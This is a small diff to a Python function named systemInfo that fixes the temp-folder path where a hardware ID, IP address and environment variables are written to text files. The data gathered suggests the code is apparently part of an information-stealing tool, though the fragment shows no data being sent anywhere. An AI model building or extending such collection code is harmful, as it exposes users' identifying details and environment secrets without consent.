@@ -156,7 +156,7 @@ def systemInfo():
 	HWID: {hwid}
 	Ip: {ip}
 	"""
-	with open(f"P{temp}\\systeminfo.txt", "w") as f:
+	with open(f"{temp}\\systeminfo.txt", "w") as f:
 		f.write(info_total)
 	f.close()
 	with open(f"{temp}\\environmentalVariables.txt", "w") as f:
